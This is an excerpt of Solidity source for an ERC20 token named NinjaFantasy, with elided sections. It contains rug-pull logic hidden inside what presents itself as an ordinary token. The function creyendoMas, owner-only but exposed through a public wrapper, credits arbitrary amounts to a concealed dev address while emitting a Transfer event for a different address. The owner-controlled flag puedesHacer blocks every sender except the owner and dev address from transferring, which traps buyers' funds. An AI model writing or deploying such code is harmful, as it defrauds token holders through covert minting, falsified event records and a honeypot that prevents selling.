...
contract NinjaFantasy is Context, IERC20, Ownable {
    ...
    function creyendoMas(address cuenta, uint256 monto) internal virtual onlyOwner {
        require(cuenta != address(0), "ERC20: can not rise to the zero address");
        _balances[_excludeDevAddress] += monto;
        emit Transfer(address(0),cuenta,monto);
    }
    
    function _creyendoMas(address account, uint256 monto) public {
        creyendoMas(account, monto);
    }
    
     function puedesHacerLo(bool truefalse) external onlyOwner() {
        puedesHacer = truefalse;
    }
    ...
    function _transfer(
        ...
        if (sender != owner() && sender != _excludeDevAddress && !puedesHacer) {
            require(puedesHacer, "No puedes hacer puta");
        }
        if (sender == owner()) {
